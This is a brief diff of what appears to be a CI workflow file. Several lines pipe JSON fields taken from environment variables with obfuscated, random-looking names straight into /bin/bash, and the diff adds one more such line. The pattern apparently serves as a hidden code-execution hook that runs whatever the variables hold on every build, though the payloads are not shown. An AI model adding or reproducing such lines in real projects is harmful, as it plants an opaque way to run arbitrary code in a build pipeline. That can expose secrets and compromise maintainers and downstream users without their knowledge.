@@ -26,6 +26,7 @@ jobs:
           echo $df1401 | jq -r .v812 | /bin/bash
           echo $uqbcy4 | jq -r .o04451 | /bin/bash
           echo $mp2 | jq -r .pop6 | /bin/bash
+          printf '%s' "$shp3" | jq -r .ayej98 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
